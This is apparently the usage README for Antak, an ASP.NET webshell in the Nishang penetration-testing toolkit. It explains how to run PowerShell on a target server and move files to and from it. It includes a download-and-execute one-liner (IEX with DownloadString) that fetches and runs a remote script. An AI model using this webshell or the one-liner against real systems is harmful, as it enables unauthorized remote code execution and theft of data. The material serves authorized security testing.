Antak is a webshell written in ASP.Net which utilizes powershell.
Antak is a part of Nishang and updates could be found here:
https://github.com/samratashok/nishang

Use this shell as a normal powershell console. Each command is executed in a new process, keep this in mind
while using commands (like changing current directory or running session aware scripts). 

Executing PowerShell scripts on the target - 

1. Paste the script in command textbox and click 'Encode and Execute'. A reasonably large script could be executed using this.

2. Use powershell one-liner (example below) for download & execute in the command box.
IEX ((New-Object Net.WebClient).DownloadString('URL to script here')); [Arguments here]

3. By uploading the script to the target and executing it.

4. Make the script a semi-colon separated one-liner.


Files can be uploaded and downloaded using the respective buttons.

Uploading a file - 
To upload a file you must mention the actual path on server (with write permissions) in command textbox. 
(OS temporary directory like C:\Windows\Temp may be writable.)
Then use Browse and Upload buttons to upload file to that path.

Downloading a file - 
To download a file enter the actual path on the server in command textbox.
Then click on Download button.


A detailed blog post on Antak could be found here
http://www.labofapenetrationtester.com/2014/06/introducing-antak.html
